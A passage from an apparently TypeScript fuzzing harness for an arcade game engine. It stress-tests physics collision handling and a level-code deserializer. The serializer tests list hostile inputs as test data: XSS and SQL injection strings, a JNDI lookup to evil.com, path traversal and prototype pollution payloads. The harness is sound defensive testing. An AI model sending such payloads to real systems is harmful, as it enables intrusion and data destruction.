/**
 * Aegis Arcade Hub - Challenger 1 Adversarial Verification Harness (Cycles 1-300)
 * 
 * Objective:
 * 1. Hypersonic Physics & CCD Fuzzer (150 to 300 px/step velocities across dense bumper clusters,
 *    singularity centers, 2P paddle bounds, acute wall collisions, and AABB hurdles).
 * 2. 500+ Hostile, Malformed, Non-Base64, Corrupted, and Oversized Payload Fuzzer
 *    against Level Serializer / Deserializer.
 * 3. Mathematical Determinism, Singularity Softening, and Float Precision Stability.
 * 
 * Strict ASCII UI formatting: 100% Windows ANSI-1252 Safe.
 */

import { PhysicsEngine } from "../src/lib/gameEngine/physics.ts";
import { safeDeserializeLevelCode, exportLevelToBase64 } from "../src/lib/gameEngine/levels.ts";
import {
  AABBHurdle,
  Bumper,
  CustomLevelData,
  GravityWell,
  PlayerOrb,
  Vector2D,
} from "../src/lib/gameEngine/types.ts";

// Helper to construct a standard mock orb
function createMockOrb(overrides: Partial<PlayerOrb> = {}): PlayerOrb {
  return {
    x: 300,
    y: 400,
    vx: 0,
    vy: -15,
    radius: 12,
    baseRadius: 12,
    mass: 1.0,
    color: "#00F0FF",
    glowColor: "#00F0FF",
    trailColor: "#00F0FF",
    hp: 100,
    maxHp: 100,
    shields: 1,
    maxShields: 1,
    energy: 100,
    maxEnergy: 100,
    overdriveCharge: 0,
    isOverdrive: false,
    overdriveTimer: 0,
    combo: 0,
    maxCombo: 0,
    comboTimer: 0,
    piercing: 0,
    splitCount: 0,
    lightningArcs: 0,
    isGhost: false,
    trailHistory: [],
    launchesLeft: 5,
    maxLaunches: 5,
    ...overrides,
  };
}

// Prebuilt Community Levels for Roundtrip Fidelity Testing
const TEST_COMMUNITY_LEVELS: CustomLevelData[] = [
  {
    id: "lvl_pinball_mayhem",
    name: "Pinball Super-Colosseum",
    author: "AegisCore",
    targetScore: 12000,
    ambientColor: "#0F051D",
    hasBoss: false,
    bumpers: [
      { id: "b1", x: 200, y: 200, radius: 24, type: "BOUNCE_SUPER", hp: 3, maxHp: 3, points: 300, shards: 15, pulsePhase: 0, color: "#39FF14", glowColor: "rgba(57,255,20,0.5)", isDestroyed: false },
      { id: "b2", x: 400, y: 200, radius: 24, type: "BOUNCE_SUPER", hp: 3, maxHp: 3, points: 300, shards: 15, pulsePhase: 1, color: "#39FF14", glowColor: "rgba(57,255,20,0.5)", isDestroyed: false },
      { id: "b3", x: 300, y: 320, radius: 30, type: "GOLDEN_CORE", hp: 4, maxHp: 4, points: 800, shards: 60, pulsePhase: 2, color: "#FFD700", glowColor: "rgba(255,215,0,0.7)", isDestroyed: false },
      { id: "b4", x: 150, y: 400, radius: 20, type: "EXPLOSIVE", hp: 1, maxHp: 1, points: 400, shards: 20, pulsePhase: 3, color: "#FF3366", glowColor: "rgba(255,51,102,0.5)", isDestroyed: false },
      { id: "b5", x: 450, y: 400, radius: 20, type: "EXPLOSIVE", hp: 1, maxHp: 1, points: 400, shards: 20, pulsePhase: 4, color: "#FF3366", glowColor: "rgba(255,51,102,0.5)", isDestroyed: false },
    ],
    gravityWells: [
      { id: "gw1", x: 300, y: 250, radius: 120, innerRadius: 16, strength: 4500, pulseSpeed: 0.05, pulseOffset: 0, color: "#00F0FF" },
    ],
    laserBeams: [],
  },
  {
    id: "lvl_laser_gauntlet",
    name: "Dual Laser Helix",
    author: "QuantumPilot",
    targetScore: 18000,
    ambientColor: "#170308",
    hasBoss: true,
    bossType: "VORTEX_TITAN",
    bumpers: [
      { id: "b1", x: 220, y: 350, radius: 22, type: "PRISM_LASER", hp: 3, maxHp: 3, points: 500, shards: 25, pulsePhase: 0, color: "#BF00FF", glowColor: "rgba(191,0,255,0.5)", isDestroyed: false },
      { id: "b2", x: 380, y: 350, radius: 22, type: "PRISM_LASER", hp: 3, maxHp: 3, points: 500, shards: 25, pulsePhase: 1, color: "#BF00FF", glowColor: "rgba(191,0,255,0.5)", isDestroyed: false },
    ],
    gravityWells: [
      { id: "gw1", x: 300, y: 400, radius: 100, innerRadius: 14, strength: -3800, pulseSpeed: 0.08, pulseOffset: 0, color: "#FF3366" },
    ],
    laserBeams: [
      { id: "l1", startX: 300, startY: 300, endX: 300, endY: 300, angle: 0, angularVelocity: 0.025, length: 140, isActive: true, warmupTimer: 0, activeTimer: 0, duration: 180, interval: 120, damage: 1, color: "#FF0055" },
    ],
  },
  {
    id: "lvl_titan_crucible",
    name: "Titan Singularity Crucible",
    author: "AegisCommand",
    targetScore: 25000,
    ambientColor: "#0A0314",
    hasBoss: true,
    bossType: "CHRONOS_PRIME",
    bumpers: [
      { id: "b1", x: 180, y: 220, radius: 22, type: "BOUNCE_SUPER", hp: 3, maxHp: 3, points: 300, shards: 20, pulsePhase: 0, color: "#39FF14", glowColor: "rgba(57,255,20,0.5)", isDestroyed: false },
      { id: "b2", x: 420, y: 220, radius: 22, type: "BOUNCE_SUPER", hp: 3, maxHp: 3, points: 300, shards: 20, pulsePhase: 1, color: "#39FF14", glowColor: "rgba(57,255,20,0.5)", isDestroyed: false },
      { id: "b3", x: 300, y: 360, radius: 28, type: "GOLDEN_CORE", hp: 4, maxHp: 4, points: 900, shards: 75, pulsePhase: 2, color: "#FFD700", glowColor: "rgba(255,215,0,0.7)", isDestroyed: false },
    ],
    gravityWells: [
      { id: "gw1", x: 200, y: 300, radius: 100, innerRadius: 15, strength: 4000, pulseSpeed: 0.06, pulseOffset: 0, color: "#00F0FF" },
      { id: "gw2", x: 400, y: 300, radius: 100, innerRadius: 15, strength: -3600, pulseSpeed: 0.06, pulseOffset: Math.PI, color: "#FF3366" },
    ],
    laserBeams: [],
  },
  {
    id: "lvl_void_leviathan",
    name: "Void Leviathan Maw",
    author: "VoidPilot",
    targetScore: 40000,
    ambientColor: "#02080E",
    hasBoss: true,
    bossType: "VOID_LEVIATHAN",
    bumpers: [
      { id: "b1", x: 150, y: 250, radius: 24, type: "PRISM_LASER", hp: 4, maxHp: 4, points: 600, shards: 35, pulsePhase: 0, color: "#BF00FF", glowColor: "rgba(191,0,255,0.5)", isDestroyed: false },
      { id: "b2", x: 450, y: 250, radius: 24, type: "PRISM_LASER", hp: 4, maxHp: 4, points: 600, shards: 35, pulsePhase: 1, color: "#BF00FF", glowColor: "rgba(191,0,255,0.5)", isDestroyed: false },
      { id: "b3", x: 300, y: 200, radius: 26, type: "GOLDEN_CORE", hp: 5, maxHp: 5, points: 1000, shards: 80, pulsePhase: 2, color: "#FFD700", glowColor: "rgba(255,215,0,0.7)", isDestroyed: false },
    ],
    gravityWells: [
      { id: "gw1", x: 300, y: 320, radius: 130, innerRadius: 20, strength: 5200, pulseSpeed: 0.07, pulseOffset: 0, color: "#00FFCC" },
    ],
    laserBeams: [],
  },
];

// ============================================================================
// SUITE 1: HYPERSONIC PHYSICS & CCD FUZZER (150 - 300 px/step)
// ============================================================================
export interface HypersonicFuzzReport {
  totalTrials: number;
  velocityRange: [number, number];
  hypersonicClusterTrials: number;
  singularityCenterTrials: number;
  neonDuelPaddleTrials: number;
  acuteGrazingAngleTrials: number;
  aabbObstacleTrials: number;
  raycastFuzzTrials: number;
  boundaryBreaches: number;
  bumperTunnelingPasses: number;
  paddleTunnelingPasses: number;
  nanCoordinatesDetected: number;
  infiniteCoordinatesDetected: number;
  tunnelingAnomalyRate: number;
  durationMs: number;
}

export function runHypersonicPhysicsFuzzer(trialCount: number = 25000): HypersonicFuzzReport {
  const start = performance.now();
  const width = 600;
  const height = 750;

  let boundaryBreaches = 0;
  let bumperTunnelingPasses = 0;
  let paddleTunnelingPasses = 0;
  let nanCoords = 0;
  let infCoords = 0;

  let clusterTrials = 0;
  let singularityTrials = 0;
  let paddleTrials = 0;
  let acuteTrials = 0;
  let aabbTrials = 0;
  let raycastTrials = 0;

  // Ultra-Dense Bumper Matrix (concentric ring and grid formations)
  const clusterBumpers: Bumper[] = [
    { id: "b1", x: 250, y: 250, radius: 24, type: "STANDARD", hp: 50, maxHp: 50, points: 100, shards: 5, pulsePhase: 0, color: "#00F0FF", glowColor: "#00F0FF", isDestroyed: false },
    { id: "b2", x: 300, y: 250, radius: 24, type: "BOUNCE_SUPER", hp: 50, maxHp: 50, points: 200, shards: 10, pulsePhase: 0, color: "#39FF14", glowColor: "#39FF14", isDestroyed: false },
    { id: "b3", x: 350, y: 250, radius: 24, type: "GOLDEN_CORE", hp: 50, maxHp: 50, points: 500, shards: 25, pulsePhase: 0, color: "#FFD700", glowColor: "#FFD700", isDestroyed: false },
    { id: "b4", x: 275, y: 300, radius: 24, type: "EXPLOSIVE", hp: 50, maxHp: 50, points: 300, shards: 15, pulsePhase: 0, color: "#FF3366", glowColor: "#FF3366", isDestroyed: false },
    { id: "b5", x: 325, y: 300, radius: 24, type: "STANDARD", hp: 50, maxHp: 50, points: 100, shards: 5, pulsePhase: 0, color: "#00F0FF", glowColor: "#00F0FF", isDestroyed: false },
    { id: "b6", x: 300, y: 350, radius: 28, type: "BOUNCE_SUPER", hp: 50, maxHp: 50, points: 300, shards: 15, pulsePhase: 0, color: "#39FF14", glowColor: "#39FF14", isDestroyed: false },
  ];

  // Gravity Singularity Wells
  const singularityWells: GravityWell[] = [
    { id: "sing_core", x: 300, y: 300, radius: 150, innerRadius: 18, strength: 6000, pulseSpeed: 0.05, pulseOffset: 0, color: "#00F0FF" },
    { id: "repulse_core", x: 150, y: 200, radius: 120, innerRadius: 14, strength: -5000, pulseSpeed: 0.06, pulseOffset: Math.PI, color: "#FF3366" },
  ];

  // Neon Duel 2P Paddles
  const leftPaddle = { x: 30, y: 300, width: 16, height: 90, speed: 8 };
  const rightPaddle = { x: 554, y: 300, width: 16, height: 90, speed: 8 };

  // AABB Hurdles
  const testHurdles: AABBHurdle[] = [
    { id: "h1", x: 180, y: 450, width: 90, height: 26, restitution: 1.15 },
    { id: "h2", x: 330, y: 450, width: 90, height: 26, restitution: 1.15 },
  ];

  for (let trial = 0; trial < trialCount; trial++) {
    // True hypersonic velocity in range [150.0, 300.0] px/step
    const speed = 150.0 + Math.random() * 150.0;
    const scenario = trial % 6;

    if (scenario === 0) {
      // 1. Hypersonic Dense Bumper Cluster Strikes
      clusterTrials++;
      const targetBumper = clusterBumpers[trial % clusterBumpers.length];
      const startX = 300 + (Math.random() - 0.5) * 200;
      const startY = 550 + Math.random() * 100;
      const angle = Math.atan2(targetBumper.y - startY, targetBumper.x - startX);
      const vx = Math.cos(angle) * speed;
      const vy = Math.sin(angle) * speed;

      const orb = createMockOrb({ x: startX, y: startY, vx, vy });
      for (let frame = 0; frame < 60; frame++) {
        const { hitBottom } = PhysicsEngine.updateOrb(orb, [], width, height, 1.0);
        for (const bmp of clusterBumpers) {
          const res = PhysicsEngine.checkBumperCollision(orb, bmp, 1.0);
          if (res.hit) {
            const dist = Math.hypot(orb.x - bmp.x, orb.y - bmp.y);
            const minDist = orb.radius + bmp.radius;
            if (dist < minDist - 0.5) {
              bumperTunnelingPasses++;
            }
          }
        }
        if (Number.isNaN(orb.x) || Number.isNaN(orb.y) || Number.isNaN(orb.vx) || Number.isNaN(orb.vy)) {
          nanCoords++;
          break;
        }
        if (!Number.isFinite(orb.x) || !Number.isFinite(orb.y) || !Number.isFinite(orb.vx) || !Number.isFinite(orb.vy)) {
          infCoords++;
          break;
        }
        if (orb.x < orb.radius - 0.5 || orb.x > width - orb.radius + 0.5 || orb.y < orb.radius - 0.5) {
          boundaryBreaches++;
          break;
        }
        if (hitBottom || orb.y > height + 50) break;
      }
    } else if (scenario === 1) {
      // 2. Direct Singularity Center and Near-Miss Launches
      singularityTrials++;
      const targetWell = singularityWells[trial % singularityWells.length];
      // Target directly at center or within sub-epsilon offset
      const offset = (trial % 3 === 0) ? 0 : (trial % 3 === 1) ? 1e-12 : 5.0;
      const startX = targetWell.x + (Math.random() - 0.5) * 150;
      const startY = targetWell.y + (Math.random() > 0.5 ? 1 : -1) * (100 + Math.random() * 80);
      const angle = Math.atan2((targetWell.y + offset) - startY, (targetWell.x + offset) - startX);
      const vx = Math.cos(angle) * speed;
      const vy = Math.sin(angle) * speed;

      const orb = createMockOrb({ x: startX, y: startY, vx, vy, mass: 1.0 });
      for (let frame = 0; frame < 60; frame++) {
        const { hitBottom } = PhysicsEngine.updateOrb(orb, singularityWells, width, height, 1.0);
        if (Number.isNaN(orb.x) || Number.isNaN(orb.y) || Number.isNaN(orb.vx) || Number.isNaN(orb.vy)) {
          nanCoords++;
          break;
        }
        if (!Number.isFinite(orb.x) || !Number.isFinite(orb.y) || !Number.isFinite(orb.vx) || !Number.isFinite(orb.vy)) {
          infCoords++;
          break;
        }
        if (orb.x < orb.radius - 0.5 || orb.x > width - orb.radius + 0.5 || orb.y < orb.radius - 0.5) {
          boundaryBreaches++;
          break;
        }
        if (hitBottom || orb.y > height + 50) break;
      }
    } else if (scenario === 2) {
      // 3. Neon Duel 2P Paddle Continuous Collision Detection (CCD)
      paddleTrials++;
      const isLeft = trial % 2 === 0;
      const targetPaddle = isLeft ? leftPaddle : rightPaddle;
      const diskRadius = 14;
      const diskSpeed = 150.0 + Math.random() * 150.0;

      // Start disk in center arena moving at hypersonic speed toward paddle
      const prevX = isLeft ? 200 + Math.random() * 100 : 400 - Math.random() * 100;
      const targetY = targetPaddle.y + (Math.random() * (targetPaddle.height + 40) - 20);
      const prevY = targetY + (Math.random() - 0.5) * 40;

      const diskVx = isLeft ? -diskSpeed : diskSpeed;
      const diskVy = (Math.random() - 0.5) * 50;

      // Advance one hypersonic step across the paddle front face plane
      const nextX = prevX + diskVx;
      const nextY = prevY + diskVy;

      const diskState = { x: nextX, y: nextY, vx: diskVx, vy: diskVy, radius: diskRadius };
      const ccdResult = PhysicsEngine.checkPaddleCCD(diskState, prevX, prevY, targetPaddle, isLeft);

      // Exact geometric intersection oracle:
      // Calculate exact contactY at the moment the disk center crosses faceX
      const faceX = isLeft ? targetPaddle.x + targetPaddle.width + diskRadius : targetPaddle.x - diskRadius;
      const dx = nextX - prevX;
      const crossesFace = isLeft
        ? (prevX >= faceX - 0.001 && nextX <= faceX + 0.001)
        : (prevX <= faceX + 0.001 && nextX >= faceX - 0.001);

      if (crossesFace && Math.abs(dx) > PhysicsEngine.EPSILON) {
        const t = (faceX - prevX) / dx;
        const expectedContactY = prevY + t * (nextY - prevY);
        const hitsPaddleVertically = expectedContactY >= targetPaddle.y - diskRadius &&
                                    expectedContactY <= targetPaddle.y + targetPaddle.height + diskRadius;

        if (hitsPaddleVertically) {
          // Disk definitively crossed the paddle front face plane within paddle vertical extent
          if (!ccdResult.hit) {
            // Undetected tunneling breach!
            paddleTunnelingPasses++;
          } else {
            // Verify valid rebound physics
            if (Number.isNaN(ccdResult.contactX) || Number.isNaN(ccdResult.contactY) || Number.isNaN(ccdResult.newVx) || Number.isNaN(ccdResult.newVy)) {
              nanCoords++;
            }
            if (!Number.isFinite(ccdResult.contactX) || !Number.isFinite(ccdResult.contactY) || !Number.isFinite(ccdResult.newVx) || !Number.isFinite(ccdResult.newVy)) {
              infCoords++;
            }
            // Left paddle must reflect rightward (newVx > 0); Right paddle must reflect leftward (newVx < 0)
            if (isLeft && ccdResult.newVx <= 0) paddleTunnelingPasses++;
            if (!isLeft && ccdResult.newVx >= 0) paddleTunnelingPasses++;
          }
        }
      }

      // If ccdResult registered a hit via fallback, verify returned velocity and coordinates are valid
      if (ccdResult.hit) {
        if (Number.isNaN(ccdResult.contactX) || Number.isNaN(ccdResult.contactY) || Number.isNaN(ccdResult.newVx) || Number.isNaN(ccdResult.newVy)) {
          nanCoords++;
        }
        if (!Number.isFinite(ccdResult.contactX) || !Number.isFinite(ccdResult.contactY) || !Number.isFinite(ccdResult.newVx) || !Number.isFinite(ccdResult.newVy)) {
          infCoords++;
        }
        if (isLeft && ccdResult.newVx <= 0) paddleTunnelingPasses++;
        if (!isLeft && ccdResult.newVx >= 0) paddleTunnelingPasses++;
      }
    } else if (scenario === 3) {
      // 4. Acute Grazing Angles against Arena Walls (0.001 to 0.05 radians)
      acuteTrials++;
      const acuteAngle = 0.001 + Math.random() * 0.049;
      const wallSide = trial % 3;
      let startX = 300;
      let startY = 300;
      let vx = 0;
      let vy = 0;

      if (wallSide === 0) {
        // Grazing left wall
        startX = 15;
        startY = 200 + Math.random() * 400;
        vx = -Math.sin(acuteAngle) * speed;
        vy = -Math.cos(acuteAngle) * speed;
      } else if (wallSide === 1) {
        // Grazing right wall
        startX = width - 15;
        startY = 200 + Math.random() * 400;
        vx = Math.sin(acuteAngle) * speed;
        vy = -Math.cos(acuteAngle) * speed;
      } else {
        // Grazing ceiling
        startX = 100 + Math.random() * 400;
        startY = 15;
        vx = Math.cos(acuteAngle) * speed;
        vy = -Math.sin(acuteAngle) * speed;
      }

      const orb = createMockOrb({ x: startX, y: startY, vx, vy });
      for (let frame = 0; frame < 60; frame++) {
        const { hitBottom } = PhysicsEngine.updateOrb(orb, [], width, height, 1.0);
        if (Number.isNaN(orb.x) || Number.isNaN(orb.y) || Number.isNaN(orb.vx) || Number.isNaN(orb.vy)) {
          nanCoords++;
          break;
        }
        if (!Number.isFinite(orb.x) || !Number.isFinite(orb.y) || !Number.isFinite(orb.vx) || !Number.isFinite(orb.vy)) {
          infCoords++;
          break;
        }
        if (orb.x < orb.radius - 0.5 || orb.x > width - orb.radius + 0.5 || orb.y < orb.radius - 0.5) {
          boundaryBreaches++;
          break;
        }
        if (hitBottom || orb.y > height + 50) break;
      }
    } else if (scenario === 4) {
      // 5. AABB Hurdle Obstacle Strikes
      aabbTrials++;
      const hurdle = testHurdles[trial % testHurdles.length];
      const startX = hurdle.x + Math.random() * hurdle.width;
      const startY = 600;
      const angle = -Math.PI * 0.5 + (Math.random() - 0.5) * 0.3;
      const vx = Math.cos(angle) * speed;
      const vy = Math.sin(angle) * speed;

      const orb = createMockOrb({ x: startX, y: startY, vx, vy });
      for (let frame = 0; frame < 60; frame++) {
        const { hitBottom } = PhysicsEngine.updateOrb(orb, [], width, height, 1.0);
        for (const h of testHurdles) {
          PhysicsEngine.checkAABBCollision(orb, h);
        }
        if (Number.isNaN(orb.x) || Number.isNaN(orb.y) || Number.isNaN(orb.vx) || Number.isNaN(orb.vy)) {
          nanCoords++;
          break;
        }
        if (!Number.isFinite(orb.x) || !Number.isFinite(orb.y) || !Number.isFinite(orb.vx) || !Number.isFinite(orb.vy)) {
          infCoords++;
          break;
        }
        if (orb.x < orb.radius - 0.5 || orb.x > width - orb.radius + 0.5 || orb.y < orb.radius - 0.5) {
          boundaryBreaches++;
          break;
        }
        if (hitBottom || orb.y > height + 50) break;
      }
    } else {
      // 6. Lookahead Multi-Bounce Raycast Fuzzing at Hypersonic Speed
      raycastTrials++;
      const trajPoints = PhysicsEngine.simulateTrajectory(
        300,
        500,
        { x: (Math.random() - 0.5) * speed * 2, y: -speed },
        singularityWells,
        clusterBumpers,
        width,
        height,
        150,
        { hurdles: testHurdles }
      );
      for (const p of trajPoints) {
        if (Number.isNaN(p.x) || Number.isNaN(p.y)) nanCoords++;
        if (!Number.isFinite(p.x) || !Number.isFinite(p.y)) infCoords++;
      }
    }
  }

  const durationMs = parseFloat((performance.now() - start).toFixed(2));
  const totalAnomalies = boundaryBreaches + bumperTunnelingPasses + paddleTunnelingPasses + nanCoords + infCoords;
  const tunnelingRate = parseFloat(((totalAnomalies / trialCount) * 100).toFixed(4));

  return {
    totalTrials: trialCount,
    velocityRange: [150.0, 300.0],
    hypersonicClusterTrials: clusterTrials,
    singularityCenterTrials: singularityTrials,
    neonDuelPaddleTrials: paddleTrials,
    acuteGrazingAngleTrials: acuteTrials,
    aabbObstacleTrials: aabbTrials,
    raycastFuzzTrials: raycastTrials,
    boundaryBreaches,
    bumperTunnelingPasses,
    paddleTunnelingPasses,
    nanCoordinatesDetected: nanCoords,
    infiniteCoordinatesDetected: infCoords,
    tunnelingAnomalyRate: tunnelingRate,
    durationMs,
  };
}

// ============================================================================
// SUITE 2: 500+ HOSTILE, MALFORMED & OVERSIZED BASE64 SERIALIZER FUZZER
// ============================================================================
export interface SerializerHostileReport {
  totalPayloadsTested: number;
  emptyAndWhitespaceRejections: number;
  nonBase64CharsetRejections: number;
  corruptedPaddingRejections: number;
  malformedJsonRejections: number;
  nonObjectRootRejections: number;
  invalidSchemaRejections: number;
  corruptBumperArrayRejections: number;
  prototypePollutionAttemptsBlocked: number;
  oversizedDosHandled: number;
  uncaughtExceptions: number;
  roundtripFidelityPercent: number;
  durationMs: number;
}

export function runSerializerHostileFuzzer(): SerializerHostileReport {
  const start = performance.now();
  let totalPayloads = 0;
  let emptyRejections = 0;
  let nonBase64Rejections = 0;
  let corruptPaddingRejections = 0;
  let malformedJsonRejections = 0;
  let nonObjectRejections = 0;
  let invalidSchemaRejections = 0;
  let corruptBumperRejections = 0;
  let protoPollutionBlocked = 0;
  let dosHandled = 0;
  let uncaughtExceptions = 0;
  let validRoundtrips = 0;

  // Category 1: Empty, Whitespace, Control Characters, and Null Bytes (50 payloads)
  const emptyCases: string[] = [
    "",
    " ",
    "   ",
    "\t",
    "\n",
    "\r\n",
    "\t\r\n \t ",
    "\0",
    "\0\0\0\0",
    "null",
    "undefined",
    "NaN",
    "Infinity",
    "-Infinity",
    "\x00\x01\x02\x03",
    "\u0000\u0000",
    "\u200B", // Zero-width space
    "\uFEFF", // Byte order mark
    "   \0   ",
    "\x1B[2J\x1B[H", // ANSI clear screen
  ];
  for (let i = 0; i < 30; i++) {
    emptyCases.push(" ".repeat(i + 1) + "\t".repeat(i % 3) + "\n".repeat(i % 2));
  }
  for (const tc of emptyCases) {
    totalPayloads++;
    try {
      const res = safeDeserializeLevelCode(tc);
      if (!res.success) emptyRejections++;
    } catch {
      uncaughtExceptions++;
    }
  }

  // Category 2: Non-Base64 Character Sets & Injections (75 payloads)
  const nonBase64Cases: string[] = [
    "!@#$%^&*()_+=-~`",
    "<script>alert(1)</script>",
    "SELECT * FROM users WHERE '1'='1';",
    "'; DROP TABLE levels; --",
    "${jndi:ldap://evil.com/a}",
    "{{7*7}}",
    "<%= 7 * 7 %>",
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\system32",
    "https://aegis-hub.dev/exploit",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "%%%20%%%20",
    "0xDEADBEEF",
    "\\u0000\\u0001",
    "[\"non\", \"base64\"]",
    "{\"direct\": \"json_not_base64\"}",
  ];
  for (let i = 0; i < 59; i++) {
    nonBase64Cases.push(`!test_payload_${i}_#$*&@^()`);
  }
  for (const tc of nonBase64Cases) {
    totalPayloads++;
    try {
      const res = safeDeserializeLevelCode(tc);
      if (!res.success) nonBase64Rejections++;
    } catch {
      uncaughtExceptions++;
    }
  }

  // Category 3: Corrupted Base64 Length & Bad Padding (75 payloads)
  const corruptPaddingCases: string[] = [
    "SGVsbG8gV29ybGQ", // Missing 1 padding char
    "Zm9vYmFy====", // Excessive padding
    "======", // Only padding
    "A", // 1 char (invalid length mod 4)
    "AA", // 2 chars unpadded
    "AAA", // 3 chars unpadded
    "A".repeat(17), // 17 chars (not mod 4)
    "A".repeat(33),
    "A".repeat(49),
    "eyJtZXNzYWdlIjogInRlc3Q", // Truncated JSON Base64
    "eyJuYW1lIjoiVGVzdCIsImJ1bXBlcnMiOls", // Truncated mid-array
    "A=AA", // Padding in middle
    "AA=A",
    "==AA",
    "=A=A",
  ];
  for (let i = 0; i < 60; i++) {
    // Generate strings of varying non-multiple-of-4 lengths
    const len = (i * 4) + 1 + (i % 3);
    corruptPaddingCases.push("B".repeat(len));
  }
  for (const tc of corruptPaddingCases) {
    totalPayloads++;
    try {
      const res = safeDeserializeLevelCode(tc);
      if (!res.success) corruptPaddingRejections++;
    } catch {
      uncaughtExceptions++;
    }
  }

  // Category 4: Valid Base64 with Malformed JSON (75 payloads)
  const malformedJsonStrings: string[] = [
    "{",
    "}",
    "{ id: 123 }", // Unquoted keys
    "{ \"name\": 'Single Quotes' }",
    "{ \"bumpers\": [",
    "{\"name\": \"test\", \"bumpers\": [}}",
    "<html><body>Not JSON</body></html>",
    "--- YAML FORMAT: true ---",
    "<<<XML>>> <root></root>",
    "var x = 10; window.run();",
    "undefined",
    "NaN",
    "{\"bumpers\": [{\"x\": 100, \"y\": 200,}]}", // Trailing comma
    "{\"bumpers\": [{\"x\": 100, \"y\": 200, \"radius\": }]}",
    "{\0\"name\": \"null_byte\"}",
  ];
  for (let i = 0; i < 60; i++) {
    malformedJsonStrings.push(`{ "unclosed_${i}": "value", "bumpers": [ { "x": ${i} `);
  }
  for (const tc of malformedJsonStrings) {
    totalPayloads++;
    const b64 = Buffer.from(tc, "utf-8").toString("base64");
    try {
      const res = safeDeserializeLevelCode(b64);
      if (!res.success) malformedJsonRejections++;
    } catch {
      uncaughtExceptions++;
    }
  }

  // Category 5: Valid Base64 of Valid JSON, but Non-Object Roots (50 payloads)
  const nonObjectJson: string[] = [
    "123",
    "-9999",
    "0",
    "3.14159265",
    "1e10",
    "\"just a plain string\"",
    "\"{\\\"fake\\\": \\\"object\\\"}\"",
    "true",
    "false",
    "null",
    "[]",
    "[\"array\", \"root\", 1, 2, 3]",
    "[[1, 2], [3, 4]]",
  ];
  for (let i = 0; i < 37; i++) {
    nonObjectJson.push(JSON.stringify(`primitive_string_payload_${i}`));
  }
  for (const tc of nonObjectJson) {
    totalPayloads++;
    const b64 = Buffer.from(tc, "utf-8").toString("base64");
    try {
      const res = safeDeserializeLevelCode(b64);
      if (!res.success) nonObjectRejections++;
    } catch {
      uncaughtExceptions++;
    }
  }

  // Category 6: Valid Base64 JSON Objects Missing Required Schema Fields (75 payloads)
  const missingSchemaObjects: string[] = [
    "{}",
    "{\"name\": \"Custom Sector Only\"}",
    "{\"targetScore\": 50000}",
    "{\"gravityWells\": []}",
    "{\"author\": \"Anonymous\", \"laserBeams\": []}",
    "{\"hasBoss\": true, \"bossType\": \"VORTEX_TITAN\"}",
    "{\"ambientColor\": \"#FF0000\"}",
    "{\"id\": \"test_id\"}",
    "{\"randomField\": 12345}",
  ];
  for (let i = 0; i < 66; i++) {
    missingSchemaObjects.push(JSON.stringify({ index: i, note: "missing bumpers array" }));
  }
  for (const tc of missingSchemaObjects) {
    totalPayloads++;
    const b64 = Buffer.from(tc, "utf-8").toString("base64");
    try {
      const res = safeDeserializeLevelCode(b64);
      if (!res.success) invalidSchemaRejections++;
    } catch {
      uncaughtExceptions++;
    }
  }

  // Category 7: Corrupted Bumper Arrays & Invalid Numerical Entities (75 payloads)
  const corruptBumperObjects: string[] = [
    "{\"bumpers\": \"not an array\"}",
    "{\"bumpers\": 12345}",
    "{\"bumpers\": true}",
    "{\"bumpers\": {}}",
    "{\"bumpers\": [null]}",
    "{\"bumpers\": [\"string item instead of object\"]}",
    "{\"bumpers\": [123]}",
    "{\"bumpers\": [[1, 2, 3]]}",
    "{\"bumpers\": [{\"x\": \"not_number\", \"y\": 200, \"radius\": 20}]}",
    "{\"bumpers\": [{\"x\": 200, \"y\": \"not_number\", \"radius\": 20}]}",
    "{\"bumpers\": [{\"x\": 200, \"y\": 200, \"radius\": \"big\"}]}",
    "{\"bumpers\": [{\"x\": 200, \"y\": 200, \"radius\": -15}]}", // Negative radius
    "{\"bumpers\": [{\"x\": 200, \"y\": 200, \"radius\": 0}]}", // Zero radius
    "{\"bumpers\": [{\"x\": 200, \"y\": 200, \"radius\": 1}]}", // Below min radius 5
    "{\"bumpers\": [{\"x\": 200, \"y\": 200, \"radius\": 99999}]}", // Above max radius 500
    "{\"bumpers\": [{\"x\": -500, \"y\": 200, \"radius\": 20}]}", // Out of bounds negative coordinate
    "{\"bumpers\": [{\"x\": 200, \"y\": 9999999, \"radius\": 20}]}", // Extreme coordinate
  ];
  for (let i = 0; i < 58; i++) {
    corruptBumperObjects.push(
      JSON.stringify({
        bumpers: [
          { x: i % 2 === 0 ? "invalid" : 100, y: i % 3 === 0 ? null : 200, radius: i % 4 === 0 ? -10 : 20 },
        ],
      })
    );
  }
  for (const tc of corruptBumperObjects) {
    totalPayloads++;
    const b64 = Buffer.from(tc, "utf-8").toString("base64");
    try {
      const res = safeDeserializeLevelCode(b64);
      if (!res.success) corruptBumperRejections++;
    } catch {
      uncaughtExceptions++;
    }
  }

  // Category 8: Prototype Pollution Attacks (60 payloads)
  const protoPollutionPayloads: string[] = [
    "{\"__proto__\": {\"polluted\": true}, \"bumpers\": []}",
    "{\"constructor\": {\"prototype\": {\"isAdmin\": true}}, \"bumpers\": []}",
    "{\"prototype\": {\"injected\": true}, \"bumpers\": []}",
    "{\"bumpers\": [], \"nested\": {\"__proto__\": {\"deep\": true}}}",
    "{\"bumpers\": [{\"__proto__\": {\"itemProto\": true}, \"x\": 100, \"y\": 100, \"radius\": 20}]}",
  ];
  for (let i = 0; i < 55; i++) {
    protoPollutionPayloads.push(
      JSON.stringify({
        [`__proto__`]: { [`attack_${i}`]: true },
        bumpers: [],
      })
    );
  }
  for (const tc of protoPollutionPayloads) {
    totalPayloads++;
    const b64 = Buffer.from(tc, "utf-8").toString("base64");
    try {
      const res = safeDeserializeLevelCode(b64);
      if (!res.success) protoPollutionBlocked++;
      // Verify global Object.prototype was NOT polluted
      const protoObj = Object.prototype as Record<string, unknown>;
      if (protoObj.polluted || protoObj.isAdmin || protoObj.injected || protoObj.deep || protoObj.itemProto) {
        throw new Error("CRITICAL SECURITY VULNERABILITY: Object.prototype was polluted!");
      }
    } catch {
      uncaughtExceptions++;
    }
  }

  // Category 9: Oversized DoS Payloads & Deep Nesting (60 payloads)
  // 1.1MB to 3MB giant strings
  for (let i = 0; i < 10; i++) {
    const hugePayload = "A".repeat((1024 * 1024) + (i * 200 * 1024)); // > 1MB
    totalPayloads++;
    try {
      const res = safeDeserializeLevelCode(hugePayload);
      if (!res.success) dosHandled++;
